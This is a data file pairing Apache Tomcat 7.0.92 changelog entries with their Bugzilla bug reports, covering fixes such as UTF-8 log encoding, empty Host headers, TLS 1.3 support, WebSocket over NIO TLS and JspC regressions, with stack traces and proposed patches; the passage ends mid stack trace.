component|version|type|bug_id|change|title|description|link
Catalina|Tomcat 7.0.92 (violetagg)|fix||Add documentation about the files context.xml.default and web.xml.default that can be used to customize conf/context.xml and conf/web.xml on a per host basis. (fschumacher)|||
Catalina|Tomcat 7.0.92 (violetagg)|fix||Ensure that a canonical path is always used for the docBase of a Context to ensure consistent behaviour. (markt)|||
Catalina|Tomcat 7.0.92 (violetagg)|fix|62788|Add explicit logging configuration to write log files using UTF-8 to align with Tomcat's use of UTF-8 by default elsewhere. (markt)|"Add explicit "".encoding=UTF-8"" to FileHandler configurations in logging.properties"|"This is inspired by a StackOverflow question [1].

While most of Tomcat 8.5/9.0 uses UTF-8 by default, the default configuration of (Async)FileHandlers in logging.properties is to use the system default character set.

1. There is no configuration for the ""encoding"" property of those FileHandlers in the default 'logging.properties' file.

2. The default value for that property is to use the system default character set. As documented in javadoc [2].


I find this odd.

My proposal is to add explicit configuration for the 'encoding' property of AsyncFileHandlers in Tomcat 9.0.x onwards to be 'UTF-8':

1catalina.org.apache.juli.AsyncFileHandler.encoding = UTF-8

etc.


I think that for a ConsoleHandler [3] it is expected to use the system encoding. It is used for monitoring at development time, and should not be used on a production system.

I think that a file written by a FileHandler is expected to preserve all information written to it, and UTF-8 suits better for this purpose.


[1] https://stackoverflow.com/questions/52591511/how-to-set-character-encoding-to-servletcontext-logs-in-tomcat

[2] http://tomcat.apache.org/tomcat-9.0-doc/api/org/apache/juli/FileHandler.html

[3] https://docs.oracle.com/javase/6/docs/api/java/util/logging/ConsoleHandler.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62788
Catalina|Tomcat 7.0.92 (violetagg)|fix|62797|Pass throwable to keep client aborts with status 200 rather than 500. Patch submitted by zikfat. (remm)|Client aborts are being written as 500 instead of 200|"Created attachment 36187 [details]
patch with a potential fix

After upgrading from Tomcat 8.0.36 to 9.0.10 I noticed new 500 errors showing up in my access logs without any associated exceptions in the application log. I believe these are caused by clients aborting their connection to the server, and that the upgrade in Tomcat versions caused the logged status code for these requests to change from 200 to 500.

Digging through Tomcat history, it looks like bug 60718 introduced an issue like this in 9.0.0.M18. After the discussion at https://markmail.org/message/4cxpwmxhtgnrwh7n it was decided that 200s were the ""least bad"" status for client aborts. The commit at https://github.com/apache/tomcat/commit/3b51ec4d35546a0244f4f7c4ec6c57ebfa5dd883 was made to fix this for 9.0.0.M22 by stopping IOExceptions from setting a 500 status code on the response.

When I trace through the code I see the fix from 9.0.0.M22 is preventing the 500 status from being set initially when the server first encounters an error trying to write to the client, but the 500 status is getting set later (but still before access log lines are written) as a side-effect of the ErrorReportValve.

The ErrorReportValve's invoke method has this line:

response.getCoyoteResponse().action(ActionCode.CLOSE_NOW, null)

Which results in the AbstractProcessor.setErrorState method getting called with a null throwable. This gets past the IOException guard added in 9.0.0.M22 and sets the 500 status on the response.

Attached is a patch which has ErrorReportValve pass through the Request's Throwable on that line. In my testing this seems to fix the issue."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62797
Catalina|Tomcat 7.0.92 (violetagg)|fix|62809|Correct a regression in the implementation of DIGEST authentication support for the Deployer Ant tasks (bug 45832) that prevented the DeployTask from working when authentication was required. (markt)|cannot remote deploy with Ant DeployTask|"I try to remote deploy with Ant DeployTask, but it not works.


source
----
DeployTask deployer = new DeployTask();
deployer.setUpdate(true);
deployer.setWar(""C:\\tmp\\WebApplication1.war""); // if change to setLocalWar, it works.
deployer.setUsername(""tomcat"");
deployer.setPassword(""tomcat"");
deployer.setUrl(""http://localhost:8080/manager/text"");
deployer.setPath(""/WebApplication1"");

deployer.execute();





stacktrace
----
Exception in thread ""main"" java.net.HttpRetryException: cannot retry due to server authentication, in streaming mode
	at org.apache.catalina.ant.AbstractCatalinaTask.execute(AbstractCatalinaTask.java:270)
	at org.apache.catalina.ant.DeployTask.execute(DeployTask.java:178)
	at tomcattest.TomcatTest.main(TomcatTest.java:28)
Caused by: java.net.HttpRetryException: cannot retry due to server authentication, in streaming mode
	at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1692)
	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1492)
	at org.apache.catalina.ant.AbstractCatalinaTask.execute(AbstractCatalinaTask.java:231)
	... 2 more"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62809
Catalina|Tomcat 7.0.92 (violetagg)|update||Update the recommended minimum Tomcat Native version to 1.2.18. (markt)|||
Catalina|Tomcat 7.0.92 (violetagg)|add||Ignore an attribute named source on Context elements provided by StandardContext. This is to suppress warnings generated by the Eclipse / Tomcat integration provided by Eclipse. Based on a patch by mdfst13. (markt)|||
Catalina|Tomcat 7.0.92 (violetagg)|add|62830|Added JniLifeCycleListener and static methods Library.loadLibrary(libraryName) and Library.load(filename) to load a native library by a shared class loader so that more than one Webapp can use it. (isapir)|Add static methods to load native libraries by the Common ClassLoader|"By design, a native library may not be loaded by more than one ClassLoader.  From [1]:

> In the JDK, each class loader manages its own set of native libraries. 
> The same JNI native library cannot be loaded into more than one class loader. 
> Doing so causes UnsatisfiedLinkError to be thrown. For example, 
> System.loadLibrary throws an UnsatisfiedLinkError when used to load a native
> library into two class loaders.

Due to that restriction, Native Libraries that are loaded by Webapp ClassLoaders may only be loaded in one Webapp.  Subsequent Webapps that attempt to load the same native library fail with an UnsatisfiedLinkError.

A working solution [2] proposes to create a small jar with a method that will load the native libraries, and place it in ${CATALINA_BASE}/lib so that it will be loaded by the Common ClassLoader.

A simpler solution would be to add the static methods `load(filename)` and `loadLibrary(libname)` that will simply call the respective System methods.  That will eliminate the need to create custom jar files and place them in the lib directory.

Patch coming shortly.

[1] https://docs.oracle.com/javase/1.5.0/docs/guide/jni/spec/invocation.html#library_version

[2] https://stackoverflow.com/questions/36936948/java-lang-unsatisfiedlinkerror-native-library-xxx-so-already-loaded-in-another"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62830
Catalina|Tomcat 7.0.92 (violetagg)|fix||Correct a typo in the Spanish resource files. Patch provided by Diego Agull√≥. (markt)|||
Catalina|Tomcat 7.0.92 (violetagg)|fix|62868|Order the Enumeration<URL> provided by WebappClassLoaderBase.getResources(String) according to the setting of the delegate flag. (markt)|WebappClassLoaderBase getResources(String) is not ordered according to delegate flag|"WebappClassLoaderBase.getResources(String) is not implemented. Resulting in fallback to normal ClassLoader which is not self first as a webapp classloader should be. This is a problem when e.g. using javax.activation, which uses getResources for e.g. which mail provider will be used.

This seems a regression from https://bz.apache.org/bugzilla/show_bug.cgi?id=3936."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62868
Coyote|Tomcat 7.0.92 (violetagg)|add||Add TLSv1.3 to the default protocols and to the all alias for JSSE based TLS connectors when running on a JVM that supports TLS version 1.3. One such JVM is OpenJDK version 11. (rjung)|||
Coyote|Tomcat 7.0.92 (violetagg)|fix|62739|Do not reject requests with an empty HTTP Host header. Such requests are unusual but not invalid. Patch provided by Michael Orr. (markt)|Tomcat should allow blank Host header|"Changes to request handling in 7.0.87 mean that sending an empty string for the ""Host"" request header now results in a ""400 Bad Request"" response, even though the request is legal.

This can be demonstrated by running the following command:

    curl -XGET -v -I -H ""Host: "" ""http://localhost:8080/RELEASE-NOTES.txt""

The request that is sent is:

    GET /RELEASE-NOTES.txt HTTP/1.1
    Host:
    User-Agent: curl/7.54.0
    Accept: */*

According to RFC 7230 (https://tools.ietf.org/html/rfc7230#section-5.4) it is legal for the Host header to have an empty field value:

    ""If the authority component is missing or undefined for the target URI, 
    then a client MUST send a Host header field with an empty field-value.""

While uncommon, I have come across such cases.  For example, an F5 load balancer wants to make an HTTP request to help determine whether or not a given HTTP server is still 'alive', so it creates a TCP connection and then sends the following text string:

    GET /alive.html HTTP/1.1\r\nHost:\r\n\r\n

Changing this string so that the Host header is not blank would, of course, be the easiest option, but it is not always possible to do, especially if the same string is used for many disparate server types.

We should modify the code (AbstractHttp11Processor, I'm guessing?) to allow a blank Host header value."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62739
Coyote|Tomcat 7.0.92 (violetagg)|add|62748|Add TLS 1.3 support for the APR/Native connector. (schultz/markt)|Add support for TLS 1.3 (RFC 8446)|"Created attachment 36157 [details]
Screenshots confirming tls connection version and browser used

Please add support for TLS 1.3 (RFC 8446) in tomcat-native for use with APR/tomcat. Latest stable OpenSSL version (1.1.1)  supports it.Even though OpenSSL 1.1.1 is intended to be  a drop-in replacement, using it with tomcat-native 1.2.17  and APR 1.6.3 still producess TLS 1.2 connection , here is tomcat(7.0.70) connector snippet  

   <!-- Define a SSL HTTP/1.1 Connector on port 8443 -->
<Connector allowTrace=""false"" server="" "" port=""8443"" maxPostSize=""10485760 ""  maxHttpHeaderSize=""1048576""
           protocol=""org.apache.coyote.http11.Http11AprProtocol""
           connectionTimeout=""20000""
           redirectPort=""8443""
           SSLHonorCipherOrder=""true""
           SSLCertificateFile=""/home/idis/STAR_ieml_ru.crt""
           SSLCertificateKeyFile=""/home/idis/server.key""
           SSLCertificateChainFile=""/home/idis/authorities.crt""

           maxThreads=""350""  minSpareThreads=""25"" SSLEnabled=""true""
           enableLookups=""false"" disableUploadTimeout=""true""
           acceptCount=""100"" scheme=""https"" secure=""true""
   compression=""force""
SSLCipherSuite=""TLS_AES_256_GCM_SHA384,TLS_CHACHA20_POLY1305_SHA384,TLS_AES_128_GCM_SHA256,ECDHE-ECDSA-CHACHA20-POLY1305,ECDHE-ECDSA-AES256-GCM-SHA384,ECDHE-ECDSA-AES256-GCM-SHA256,ECDHE-RSA-AES256-GCM-SHA384,ECDHE-RSA-CHACHA20-POLY1305,ECDHE-ECDSA-AES128-GCM-SHA256,  ECDHE-RSA-AES128-GCM-SHA256,ECDHE-ECDSA-AES256-SHA384,ECDHE-RSA-AES256-SHA384,ECDHE-ECDSA-AES128-SHA256,ECDHE-RSA-AES128-SHA256,
ECDHE-RSA-AES128-SHA,ECDHE-RSA-AES256-SHA""/>

server is started normally(snippet from catalina.out)
Sep 19, 2018 11:09:04 AM org.apache.catalina.core.AprLifecycleListener lifecycleEvent
INFO: Loaded APR based Apache Tomcat Native library 1.2.17 using APR version 1.6.3.
Sep 19, 2018 11:09:04 AM org.apache.catalina.core.AprLifecycleListener lifecycleEvent
INFO: APR capabilities: IPv6 [true], sendfile [true], accept filters [false], random [true].
Sep 19, 2018 11:09:04 AM org.apache.catalina.core.AprLifecycleListener initializeSSL
INFO: OpenSSL successfully initialized (OpenSSL 1.1.1  11 Sep 2018)
Sep 19, 2018 11:09:06 AM org.apache.coyote.AbstractProtocol init
INFO: Initializing ProtocolHandler [""http-apr-8080""]
Sep 19, 2018 11:09:06 AM org.apache.coyote.AbstractProtocol init
INFO: Initializing ProtocolHandler [""http-apr-8443""]
Sep 19, 2018 11:09:06 AM org.apache.catalina.startup.Catalina load
INFO: Initialization processed in 3684 ms
Sep 19, 2018 11:09:06 AM org.apache.catalina.core.StandardService startInternal
INFO: Starting service Catalina
Sep 19, 2018 11:09:06 AM org.apache.catalina.core.StandardEngine startInternal
INFO: Starting Servlet Engine:
Sep 19, 2018 11:09:06 AM org.apache.catalina.startup.HostConfig deployDescriptor
INFO: Deploying configuration descriptor /opt/tomcat/conf/Catalina/localhost/Education.xml
Sep 19, 2018 11:09:32 AM org.apache.catalina.startup.HostConfig deployDescriptor
INFO: Deployment of configuration descriptor /opt/tomcat/conf/Catalina/localhost/Education.xml has finished in 26,350 ms
Sep 19, 2018 11:09:32 AM org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deploying web application directory /opt/tomcat/webapps/yui
Sep 19, 2018 11:09:33 AM org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deployment of web application directory /opt/tomcat/webapps/yui has finished in 319 ms
Sep 19, 2018 11:09:33 AM org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deploying web application directory /opt/tomcat/webapps/ROOT
Sep 19, 2018 11:09:33 AM org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deployment of web application directory /opt/tomcat/webapps/ROOT has finished in 230 ms
Sep 19, 2018 11:09:33 AM org.apache.coyote.AbstractProtocol start
INFO: Starting ProtocolHandler [""http-apr-8080""]
Sep 19, 2018 11:09:33 AM org.apache.coyote.AbstractProtocol start
INFO: Starting ProtocolHandler [""http-apr-8443""]
Sep 19, 2018 11:09:33 AM org.apache.catalina.startup.Catalina start
INFO: Server startup in 27340 ms"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62748
Coyote|Tomcat 7.0.92 (violetagg)|fix|62791|Remove an unnecessary check in the NIO TLS implementation that prevented from secure WebSocket connections from being established. (markt)|"SecureNioChannel fails with ""IllegalArgumentException: You can only read using the application read buffer provided by the handler."""|"I ran into issue with Tomcat 9 failing to handle data exchange via WSS: 

02-Oct-2018 17:02:01.421 SEVERE [https-jsse-nio-8443-exec-9] org.apache.coyote.AbstractProtocol$ConnectionHandler.process Error reading request, ignored
 java.lang.IllegalArgumentException: You can only read using the application read buffer provided by the handler.
	at org.apache.tomcat.util.net.SecureNioChannel.read(SecureNioChannel.java:571)
	at org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper.fillReadBuffer(NioEndpoint.java:1204)
	at org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper.read(NioEndpoint.java:1140)
	at org.apache.tomcat.websocket.server.WsFrameServer.onDataAvailable(WsFrameServer.java:72)
	at org.apache.tomcat.websocket.server.WsFrameServer.doOnDataAvailable(WsFrameServer.java:171)
	at org.apache.tomcat.websocket.server.WsFrameServer.notifyDataAvailable(WsFrameServer.java:151)
	at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler.upgradeDispatch(WsHttpUpgradeHandler.java:148)
	at org.apache.coyote.http11.upgrade.UpgradeProcessorInternal.dispatch(UpgradeProcessorInternal.java:54)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:53)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:770)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1415)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:748)


On a frontend side, I have a pretty simple javascript, which sends its state updates via web sockets (text) to the backend service (simple spring app running in Tomcat).
After Tomcat upgrade (from 8.0.53 to 9.0.12), application started failing to establish web socket connections with ssl-enabled connector (""plain"" web sockets work fine). 

Steps to reproduce:
1. Generate certificate (I used steps from here: https://confluence.atlassian.com/doc/running-confluence-over-ssl-or-https-161203.html#RunningConfluenceOverSSLorHTTPS-Option1:Createaself-signedcertificate)
2. Configure ""secured"" connector in server.xml:
<Connector port=""8443"" maxHttpHeaderSize=""8192""
                   maxThreads=""150"" minSpareThreads=""25""
                   protocol=""org.apache.coyote.http11.Http11NioProtocol""
                   enableLookups=""false"" disableUploadTimeout=""true""
                   acceptCount=""100"" scheme=""https"" secure=""true""
                   clientAuth=""false"" sslProtocols=""TLSv1,TLSv1.1,TLSv1.2""      
                   sslEnabledProtocols=""TLSv1,TLSv1.1,TLSv1.2""
                   SSLEnabled=""true""
                   URIEncoding=""UTF-8"" keystorePass=""changeit""
                   keystoreFile=""/Users/user/.keystore""/>

With such connector settings, all attempts to establish web socket connections over ssl fail with exception above. At the same time:
1. Plain web sockets work
<Connector port=""8090"" connectionTimeout=""20000"" 
                   maxThreads=""48"" minSpareThreads=""10""
                   enableLookups=""false"" acceptCount=""10"" debug=""0"" URIEncoding=""UTF-8""
                   protocol=""org.apache.coyote.http11.Http11NioProtocol""/>
2. All non-websockets requests work (both http and https)
3. Everything works when I downgrade Tomcat to version 8.0.53 (I didn't try other versions)

Looking a bit deeper into the problem, it seems that handshake succeeds, but Tomcat fails on the first attempt to read the data from a web socket.

It looks like WsFrameServer does not respect SocketBufferHandler settings from NioEndpoint$NioSocketWrapper at the time of its (WsFrameServer) instantiation in WsHttpUpgradeHandler, and always creates its own read buffer (WsFrameBase.java:93). Later, NioEndpoint$NioSocketWrapper tries its best to fill in this buffer as much as it could, and attempts to read directly to the buffer from the websocket (NioEndpoint.java:1204), which causes buffer check failure in SecureNioChannel.

There are several ways of fixing it.
1. The most obvious solution is to disable direct reads from the socket. Easy, but probably comes with performance degradation in some cases:
Index: java/org/apache/tomcat/util/net/NioEndpoint.java
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
--- java/org/apache/tomcat/util/net/NioEndpoint.java	(revision b648bba7acc3529c35d7bc5c54639a3dcb08e812)
+++ java/org/apache/tomcat/util/net/NioEndpoint.java	(date 1538469054000)
@@ -1135,26 +1135,16 @@
 
             // The socket read buffer capacity is socket.appReadBufSize
             int limit = socketBufferHandler.getReadBuffer().capacity();
-            if (to.remaining() >= limit) {
-                to.limit(to.position() + limit);
-                nRead = fillReadBuffer(block, to);
-                if (log.isDebugEnabled()) {
-                    log.debug(""Socket: ["" + this + ""], Read direct from socket: ["" + nRead + ""]"");
-                }
-                updateLastRead();
-            } else {
-                // Fill the read buffer as best we can.
-                nRead = fillReadBuffer(block);
-                if (log.isDebugEnabled()) {
-                    log.debug(""Socket: ["" + this + ""], Read into buffer: ["" + nRead + ""]"");
-                }
-                updateLastRead();
+            nRead = fillReadBuffer(block);
+            if (log.isDebugEnabled()) {
+                log.debug(""Socket: ["" + this + ""], Read into buffer: ["" + nRead + ""]"");
+            }
+            updateLastRead();
 
-                // Fill as much of the remaining byte array as possible with the
-                // data that was just read
-                if (nRead > 0) {
-                    nRead = populateReadBuffer(to);
-                }
+            // Fill as much of the remaining byte array as possible with the
+            // data that was just read
+            if (nRead > 0) {
+                nRead = populateReadBuffer(to);
             }
             return nRead;
         }

2. Another possible solution would be to use temporary buffer in WsFrameServer:
Index: java/org/apache/tomcat/websocket/server/WsFrameServer.java
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
--- java/org/apache/tomcat/websocket/server/WsFrameServer.java	(revision b648bba7acc3529c35d7bc5c54639a3dcb08e812)
+++ java/org/apache/tomcat/websocket/server/WsFrameServer.java	(date 1538469610000)
@@ -69,7 +69,10 @@
             // Fill up the input buffer with as much data as we can
             inputBuffer.mark();
             inputBuffer.position(inputBuffer.limit()).limit(inputBuffer.capacity());
-            int read = socketWrapper.read(false, inputBuffer);
+            int capacity = inputBuffer.capacity();
+            byte[] byteArray = new byte[capacity];
+            int read = socketWrapper.read(false, byteArray, 0, capacity);
+            inputBuffer.put(byteArray);
             inputBuffer.limit(inputBuffer.position()).reset();
             if (read < 0) {
                 throw new EOFException();
Disadvantages for this approach would be creation of unnecessary byte buffer (i.e. allocating unnecessary memory) and (possibly) race conditions (if inputBuffer is written while we're reading to byteArray)

3. We may also get rid of buffer check in SecureNioChannel (security concern) or add some parameter to ignore that check (a bit ""dirty"" solution as for me):
Index: java/org/apache/tomcat/util/net/NioEndpoint.java
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
--- java/org/apache/tomcat/util/net/NioEndpoint.java	(revision b648bba7acc3529c35d7bc5c54639a3dcb08e812)
+++ java/org/apache/tomcat/util/net/NioEndpoint.java	(date 1538470221000)
@@ -1201,7 +1201,7 @@
                     }
                 }
             } else {
-                nRead = channel.read(to);
+                nRead = channel instanceof SecureNioChannel ? ((SecureNioChannel)channel).read(to, true) : channel.read(to);
                 if (nRead == -1) {
                     throw new EOFException();
                 }
Index: java/org/apache/tomcat/util/net/SecureNioChannel.java
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
--- java/org/apache/tomcat/util/net/SecureNioChannel.java	(revision b648bba7acc3529c35d7bc5c54639a3dcb08e812)
+++ java/org/apache/tomcat/util/net/SecureNioChannel.java	(date 1538470221000)
@@ -565,8 +565,12 @@
      */
     @Override
     public int read(ByteBuffer dst) throws IOException {
+        return read(dst, false);
+    }
+
+    public int read(ByteBuffer dst, boolean ignoreBufferCheck) throws IOException {
         // Make sure we only use the ApplicationBufferHandler's buffers
-        if (dst != getBufHandler().getReadBuffer() && (getAppReadBufHandler() == null
+        if (!ignoreBufferCheck && dst != getBufHandler().getReadBuffer() && (getAppReadBufHandler() == null
                 || dst != getAppReadBufHandler().getByteBuffer())) {
             throw new IllegalArgumentException(sm.getString(""channel.nio.ssl.invalidBuffer""));
         }



There is a workaround: to use Http11Nio2Protocol instead of Http11NioProtocol

Java version: 1.8.0_171-b11

OS: OSX and Amazon Linux

Related changes:
Introduce fillReadBuffer(boolean, ByteBuffer)  git-svn-id: https://svn.apache.org/repos/asf/tomcat/trunk@1758000 13f79535-47bb-0310-9956-ffa450edef68
Introduce a new method SocketWrapperBase.read(boolean, ByteBuffer)  git-svn-id: https://svn.apache.org/repos/asf/tomcat/trunk@1758058 13f79535-47bb-0310-9956-ffa450edef68"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62791
Jasper|Tomcat 7.0.92 (violetagg)|fix|62674|Correct a regression in the stand-alone JSP compiler utility, JspC, caused by the fix for 53492, that caused the JSP compiler to hang. (markt)|org.apache.jasper.JspC no longer compiles|"The update from 8.5.32 to 8.5.33 has caused org.apache.jasper.JspC to fail.  Symptom is that it hangs forever.  Ant output for 8.5.33:

     [java] Sep 02, 2018 9:36:19 AM org.apache.jasper.servlet.TldScanner scanJars
     [java] INFO: At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
     [java] Sep 02, 2018 9:36:19 AM org.apache.jasper.JspC execute
     [java] INFO: Generation completed with [0] errors in [616] milliseconds

vs 8.5.32:

     [java] Sep 02, 2018 12:27:17 PM org.apache.jasper.servlet.TldScanner scanJars
     [java] INFO: At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a
complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve
startup time and JSP compilation time.
    [javac] Compiling 68 source files to .../build/classes
     [xslt] Processing .../src/conf/web.xml to .../build/web.xml
     [xslt] Loading stylesheet .../src/webmerge.xsl

Neither debug flags nor strace illustrate the issue. Symptoms are identical across Ubuntu 16.04, 18.04 and FreeBSD 11.2 hosts running java 1.8.0_181 with plenty of disk and ram."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62674
Jasper|Tomcat 7.0.92 (violetagg)|fix|62721|Correct generation of web.xml header when using JspC. (markt)|Jasper generates incomplete web.xml 3.1 header|"Since 8.5.32, Jasper generates an incomplete web.xml 3.1 header:

<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
    <servlet>
        <servlet-name>org.apache.jsp.health_jsp</servlet-name>
        <servlet-class>org.apache.jsp.health_jsp</servlet-class>
    </servlet>
...
</web-app>

I believe the cause is the missing backslash on the second line of the jspc.webxml.header properties in LocalStrings.properties:

jspc.webxml.header=<?xml version=""1.0"" encoding=""{0}""?>\n\
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
\        xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""\n\
\        xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee\n\
\                http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd""\n\
\        version=""3.1""\n\
\        metadata-complete=""false"">\n\
<!--\n\
Automatically created by Apache Tomcat JspC.\n\
-->\n\
\n"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62721
Jasper|Tomcat 7.0.92 (violetagg)|fix||Fix a regression in the TLD whitespace parsing fix that broke parsing when whitespace was present between the method name and the parameters. (markt)|||
Jasper|Tomcat 7.0.92 (violetagg)|fix|62757|Correct a regression in the fix for 62603 that caused NullPointerExceptions when compiling tag files on first access when development mode was disabled and background compilation was enabled. Based on a patch by Jordi Llach. (markt)|JspCompilationContext is unable to compile class for JSP due to a null tagHandlerClass in Generator.TagHandlerInfo|"I am still debuging in order to try understand the reason for this, and improve the issue description.
The app behaviour is :
- launch tomcat 
- access a jsp which depends on several nested tags(all of them need to be compiled)
- it takes several reloads to render the jsp as expected, failing with the following exception the rest of the times

HTTP Status 500 ‚Äì Internal Server Error
Type Exception Report

Message Unable to compile class for JSP

Description The server encountered an unexpected condition that prevented it from fulfilling the request.

Exception

org.apache.jasper.JasperException: Unable to compile class for JSP
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:611)
	org.apache.jasper.servlet.JspServletWrapper.loadTagFile(JspServletWrapper.java:262)
	org.apache.jasper.compiler.TagFileProcessor.loadTagFile(TagFileProcessor.java:585)
	org.apache.jasper.compiler.TagFileProcessor.access$000(TagFileProcessor.java:48)
	org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:668)
	org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1544)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2389)
	org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2441)
	org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2447)
	org.apache.jasper.compiler.Node$Root.accept(Node.java:470)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2389)
	org.apache.jasper.compiler.TagFileProcessor.loadTagFiles(TagFileProcessor.java:691)
	org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:232)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:350)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:334)
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:595)
	org.apache.jasper.servlet.JspServletWrapper.loadTagFile(JspServletWrapper.java:262)
	org.apache.jasper.compiler.TagFileProcessor.loadTagFile(TagFileProcessor.java:585)
	org.apache.jasper.compiler.TagFileProcessor.access$000(TagFileProcessor.java:48)
	org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:668)
	org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1544)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2389)
	org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2441)
	org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2447)
	org.apache.jasper.compiler.Node$Root.accept(Node.java:470)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2389)
	org.apache.jasper.compiler.TagFileProcessor.loadTagFiles(TagFileProcessor.java:691)
	org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:232)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:350)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:334)
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:595)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:382)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:386)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:330)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:742)
	<omiting spring framework stack>
Root Cause

java.lang.NullPointerException
	sun.reflect.misc.ReflectUtil.checkPackageAccess(ReflectUtil.java:164)
	sun.reflect.misc.ReflectUtil.isPackageAccessible(ReflectUtil.java:195)
	java.beans.Introspector.getBeanInfo(Introspector.java:164)
	org.apache.jasper.compiler.Generator$TagHandlerInfo.<init>(Generator.java:4115)
	org.apache.jasper.compiler.Generator$GenerateVisitor.getTagHandlerInfo(Generator.java:2349)
	org.apache.jasper.compiler.Generator$GenerateVisitor.visit(Generator.java:1782)
	org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1544)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2389)
	org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2441)
	org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2447)
	org.apache.jasper.compiler.Node$Root.accept(Node.java:470)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2389)
	org.apache.jasper.compiler.Generator.generate(Generator.java:3653)
	org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:253)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:350)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:334)
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:595)
	org.apache.jasper.servlet.JspServletWrapper.loadTagFile(JspServletWrapper.java:262)
	org.apache.jasper.compiler.TagFileProcessor.loadTagFile(TagFileProcessor.java:585)
	org.apache.jasper.compiler.TagFileProcessor.access$000(TagFileProcessor.java:48)
	org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:668)
	org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1544)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2389)
	org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2441)
	org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2447)
	org.apache.jasper.compiler.Node$Root.accept(Node.java:470)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2389)
	org.apache.jasper.compiler.TagFileProcessor.loadTagFiles(TagFileProcessor.java:691)
	org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:232)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
